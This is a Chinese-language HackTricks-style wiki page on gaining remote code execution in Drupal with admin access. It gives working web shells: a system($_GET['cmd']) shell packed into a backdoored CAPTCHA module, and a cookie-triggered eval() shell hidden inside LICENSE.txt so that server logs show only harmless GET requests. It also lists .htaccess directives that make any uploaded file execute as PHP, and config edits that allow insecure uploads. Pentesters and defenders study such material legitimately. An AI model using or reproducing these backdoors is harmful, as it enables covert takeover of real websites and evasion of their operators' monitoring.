# Drupal RCE

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}

## 使用 PHP 过滤器模块

{% hint style="warning" %}
在旧版本的 Drupal **(8 之前)**，可以以管理员身份登录并 **启用 `PHP filter` 模块**，该模块“允许嵌入的 PHP 代码/片段被评估。”但从版本 8 开始，此模块默认未安装。
{% endhint %}

您需要 **安装插件 php**（通过访问 _/modules/php_ 检查，如果返回 **403**，则 **存在**，如果 **未找到**，则 **插件 php 未安装**）

前往 _Modules_ -> (**检查**) _PHP Filter_ -> _保存配置_

![](<../../../.gitbook/assets/image (247) (1).png>)

然后点击 _添加内容_ -> 选择 _基本页面_ 或 _文章_ -> 在正文中写入 _php shellcode_ -> 在 _文本格式_ 中选择 _PHP 代码_ -> 选择 _预览_

![](<../../../.gitbook/assets/image (338).png>)

最后只需访问新创建的节点：
```bash
curl http://drupal-site.local/node/3
```
## 安装 PHP Filter 模块

{% hint style="warning" %}
在当前版本中，默认安装后仅通过访问网页不再可能安装插件。
{% endhint %}

从版本 **8 开始，** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **模块不再默认安装**。要利用此功能，我们必须 **自己安装该模块**。

1. 从 Drupal 网站下载该模块的最新版本。
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. 下载完成后，转到 **`Administration`** > **`Reports`** > **`Available updates`**。
3. 点击 **`Browse`**，选择我们下载的目录中的文件，然后点击 **`Install`**。
4. 模块安装完成后，我们可以点击 **`Content`** 并 **创建一个新的基本页面**，类似于我们在 Drupal 7 示例中所做的。再次确保 **从 `Text format` 下拉菜单中选择 `PHP code`**。

## 后门模块

{% hint style="warning" %}
在当前版本中，默认安装后仅通过访问网页不再可能安装插件。
{% endhint %}

后门模块可以通过 **向现有模块添加一个 shell** 来创建。模块可以在 drupal.org 网站上找到。我们选择一个模块，例如 [CAPTCHA](https://www.drupal.org/project/captcha)。向下滚动并复制 tar.gz [归档](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) 的链接。

* 下载归档并提取其内容。
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* 创建一个 **PHP web shell**，内容为：
```php
<?php
system($_GET["cmd"]);
?>
```
* 接下来，我们需要创建一个 **`.htaccess`** 文件，以便为自己提供对该文件夹的访问权限。这是必要的，因为 Drupal 拒绝直接访问 **`/modules`** 文件夹。
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* 上述配置将在我们请求/modules中的文件时应用规则。将这两个文件复制到captcha文件夹并创建一个归档。
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* 假设我们对网站有 **管理访问权限**，点击侧边栏上的 **`管理`**，然后点击 **`扩展`**。接下来，点击 **`+ 安装新模块`** 按钮，我们将被带到安装页面，例如 `http://drupal-site.local/admin/modules/install` 浏览到后门化的 Captcha 压缩包并点击 **`安装`**。
* 安装成功后，浏览到 **`/modules/captcha/shell.php`** 执行命令。

## 使用配置同步对 Drupal 进行后门化 <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**分享者** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### 第 1 部分（激活 _媒体_ 和 _媒体库_）

在 _扩展_ 菜单 (/admin/modules) 中，您可以激活看似已经安装的插件。默认情况下，插件 _媒体_ 和 _媒体库_ 似乎未被激活，因此让我们激活它们。

激活前：

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

激活后：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 第 2 部分（利用功能 _配置同步_） <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

我们将利用 _配置同步_ 功能来转储（导出）和上传（导入）Drupal 配置条目：

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**补丁 system.file.yml**

让我们从补丁第一个条目 `allow_insecure_uploads` 开始：

文件：system.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

到：

文件：system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**修补 field.field.media.document.field\_media\_document.yml**

然后，修补第二个条目 `file_extensions` 从： 

文件： field.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

到：

文件：field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> 我在这篇博客中没有使用它，但需要注意的是，可以以任意方式定义条目 `file_directory`，并且它容易受到路径遍历攻击（因此我们可以在Drupal文件系统树中向上返回）。

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 第3部分（利用功能 _添加文档_） <a href="#part-3-leveraging-feature-add-document" id="part-3-leveraging-feature-add-document"></a>

最后一步是最简单的，分为两个子步骤。第一个是上传一个 .htaccess 格式的文件，以利用Apache指令并允许 .txt 文件被PHP引擎解释。第二个是上传一个包含我们有效载荷的 .txt 文件。

文件： .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
为什么这个技巧很酷？

因为一旦 Webshell（我们称之为 LICENSE.txt）被放置到 Web 服务器上，我们可以通过 `$_COOKIE` 传输我们的命令，并且在 Web 服务器日志中，这将显示为对文本文件的合法 GET 请求。

为什么将我们的 Webshell 命名为 LICENSE.txt？

简单来说，如果我们以以下文件为例 [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt)（该文件已经存在于 Drupal 核心中），我们有一个 339 行和 17.6 KB 大小的文件，这非常适合在中间添加一小段 PHP 代码（因为文件足够大）。

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

文件：已修补的 LICENSE.txt
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **第3.1部分（上传文件 .htaccess）**

首先，我们利用 _Add Document_ (/media/add/document) 功能上传包含 Apache 指令的文件 (.htaccess)。

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**第3.2部分（上传文件 LICENSE.txt）**

然后，我们再次利用 _Add Document_ (/media/add/document) 功能上传隐藏在许可证文件中的 Webshell。

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### 第4部分（与 Webshell 交互） <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

最后一部分是与 Webshell 进行交互。

如以下截图所示，如果我们的 Webshell 期望的 cookie 未定义，则在通过 Web 浏览器查询文件时会得到后续结果。

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

当攻击者设置 cookie 时，他可以与 Webshell 交互并执行任何他想要的命令。

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

正如您在日志中看到的，似乎只请求了一个 txt 文件。

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

感谢您花时间阅读本文，希望它能帮助您获取一些 shell。

{% hint style="success" %}
学习和实践 AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
